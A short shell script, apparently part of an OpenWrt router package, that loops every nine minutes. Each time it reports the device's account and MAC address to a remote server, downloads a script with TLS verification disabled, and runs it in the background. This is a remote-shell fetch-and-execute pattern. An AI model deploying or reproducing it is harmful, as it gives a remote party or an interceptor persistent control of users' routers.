#!/bin/sh

ACC=$1
ACC=`echo -n "$ACC" | base64`
CLI=`sed 's/:/-/g' /sys/class/net/eth0/address`

cd /tmp

_NAME=`basename $0`

LOCKDIR=/tmp/$_NAME.lck

cleanup () {
	if rmdir $LOCKDIR; then
		echo "Finished"
	else
		echo "Failed to remove lock directory '$LOCKDIR'"
		exit 1
	fi
}

main() {
	while :; do
		rm -f /tmp/xx.sh
		rm -f /tmp/nohup.out
		ACC=`uci get natcapd.default.account`
		/usr/bin/wget --no-check-certificate -q "https://router-sh.ptpt52.com/cmd=getshell&acc=$ACC&cli=$CLI" -O /tmp/xx.sh
		head -n1 /tmp/xx.sh | grep '#!/bin/sh' >/dev/null 2>&1 && {
			chmod +x /tmp/xx.sh
			nohup /tmp/xx.sh &
		}
		sleep 540
	done
}



if mkdir $LOCKDIR 2>/dev/null; then
	trap "cleanup" EXIT

	echo "Acquired lock, running"

	main
else
	echo "Could not create lock directory '$LOCKDIR'"
	exit 0
fi
